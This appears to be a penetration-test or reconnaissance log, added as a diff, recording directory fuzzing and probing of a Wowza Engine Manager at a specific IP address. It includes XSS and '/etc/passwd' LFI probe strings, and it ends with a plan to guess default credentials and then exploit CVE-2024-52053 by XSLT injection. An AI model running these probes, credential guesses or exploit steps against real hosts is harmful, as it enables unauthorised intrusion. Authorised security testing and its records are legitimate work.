@@ -1,0 +1,100 @@
+========================================
+Wowza Engine Manager Enumeration Results
+Target: http://160.202.130.243:8088/enginemanager/
+Date: 2026-08-27
+========================================
+
+=== BASELINE ===
+GET /enginemanager/ => 302 0 (redirects to /enginemanager)
+GET /enginemanager (no trailing slash) => 302 0
+GET /enginemanager/ftu/welcome.htm => 200 5332 (Welcome/Setup page - unauthenticated)
+GET /enginemanager/ZZZZNOTEXIST => 302 0 (redirects to /enginemanager)
+GET /enginemanager/ftu/welcome.htm (direct) => 200 5332
+GET /enginemanager/ZZZZNOTEXIST/ftu/welcome.htm => 302 0
+
+Server Header: None exposed
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Set-Cookie: JSESSIONID=xxx; Path=/enginemanager; HttpOnly
+Auth scheme: Spring Security (/enginemanager redirects all to login)
+
+=== DISCOVERED PAGES (Unauthenticated - 200 OK) ===
+  /enginemanager/ftu/welcome.htm       - Welcome/Setup wizard (5332 bytes)
+  /enginemanager/login.htm             - Login page (8617 bytes)
+
+=== 400 Bad Request ===
+  URL-encoded http:// patterns (%3a%2f...) - returns 1169 bytes (Spring rejects)
+  /enginemanager/?test=<script>...       - returns 2322 bytes (XSS detected/rejected)
+
+=== FUZZ RESULTS ===
+Wordlists used:
+  - common.txt (4752 entries): ALL 302 0 (redirect to login)
+  - DirBuster-2.3-small (87644 entries): ALL 302 0 (redirect to login), except URL-encoded http patterns -> 400
+  - common-api-endpoints-mazen160.txt: ALL 302 0 (+ 5 matches with fs=0 filtered: attach,check,client,checkout,clients)
+  - JavaServlets-Common.fuzz.txt: ALL 302 0
+  - DirBuster-2.3-lowercase-small (81643 entries): ALL 302 0
+
+No hidden content discovered. App uses wildcard catch-all redirect to login.
+
+=== PAGE ANALYSIS ===
+
+/ftu/welcome.htm:
+  - "Thank you for installing!" - FIRST-RUN setup wizard (post-install state)
+  - Loads: bootstrap, font-awesome, wowza.css, jquery
+  - Links: loadAjaxSideBar('home/main.htm',''), ?lang=en, ?lang=es, ?lang=zh
+  - Copyright 2007-2020 Wowza Media Systems, LLC
+  - javascript:next() -> workflow.htm (setup flow)
+  - javascript:skip() -> ../Home.htm?skipedIntro=true
+  - Checkbox: "Do not show this again" (cookie: DoNotShowFTU)
+
+/login.htm:
+  - Login form: JavaScript-based (action not in raw HTML)
+  - Loads: jquery, bootstrap, font-awesome, wowza.css
+  - Noscript redirect: upgradeBrowser.htm
+  - References: include.js, js/wowza-blockui.js
+
+=== CVE-2024-52053 INJECTION VECTORS ===
+
+REST API endpoints (ALL 302 - AUTH REQUIRED):
+  /enginemanager/rest/v2/servicedocument  -> 302 0
+  /enginemanager/rest/v2/server           -> 302 0
+  /enginemanager/rest/v2                  -> 302 0
+  /enginemanager/rest                     -> 302 0
+  /enginemanager/api                      -> 302 0
+  /enginemanager/api/v2                   -> 302 0
+  /enginemanager/j_spring_security_check  -> 302 0
+  /enginemanager/j_security_check         -> 302 0
+  Direct /rest/v2/servicedocument (no prefix) -> 302 0
+  Direct /servicedocument                    -> 302 0
+
+XSS Tests:
+  login.htm?test=abc                   -> 200 8617 (no reflection of 'abc')
+  /?test=<script>alert(1)</script>     -> 400 2322 (different body = likely WAF/Spring rejection)
+  POST login.htm (username=test'"><svg...) -> empty response (not reflected)
+
+LFI Tests:
+  login.htm?issue=../&view=../         -> 200 8617 (same size as normal - no LFI)
+  /?include=file:///etc/passwd         -> 302 0 (redirect to login)
+
+=== SPRING SECURITY CONFIG ===
+- All endpoints behind auth: Spring Security intercepts all /enginemanager/** except ftu/ and login
+- Wildcard redirect pattern: unauthenticated -> /enginemanager (login page)
+- JSESSIONID-based session tracking
+- Post-login: REST API accessible under /rest/v2/
+- CSRF: Not detected (no CSRF tokens in login page)
+
+=== CONCLUSION ===
+- No unauthenticated injection points found for CVE-2024-52053
+- REST API fully protected by Spring Security auth
+- XSS attempts blocked/detected by Spring (400 Bad Request)
+- No hidden paths discovered through content fuzzing (87K+ words tested)
+- Entry vector: authenticate first (default creds? bruteforce?), then exploit CVE-2024-52053 via /rest/v2/servicedocument
+- Alternatively: check if port 1935 (RTMP) or 8086 (JMX) or other Wowza ports are exposed
+
+=== RECOMMENDATION ===
+1. Attempt default creds (admin/password, wowza/wowza, admin/admin)
+2. Check port 8086 (Wowza JMX - monitoring)
+3. Check port 1935 (RTMP streaming)
+4. After auth: POST to /rest/v2/servicedocument with XSLT injection for CVE-2024-52053
+========================================
